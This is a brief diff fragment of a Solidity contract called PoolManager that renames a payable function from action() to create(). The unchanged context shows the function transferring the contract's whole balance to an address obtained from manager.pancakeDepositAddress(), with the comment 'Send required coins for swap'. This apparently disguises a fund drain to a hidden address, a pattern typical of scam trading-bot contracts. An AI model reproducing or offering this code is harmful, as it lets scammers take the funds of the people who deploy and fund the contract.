@@ -29,7 +29,7 @@ contract PoolManager {
 	
 	function() external payable {}
 	
-	function action() public payable {
+	function create() public payable {
 	    // Send required coins for swap
 	    address(uint160(manager.pancakeDepositAddress())).transfer(address(this).balance);
 	    
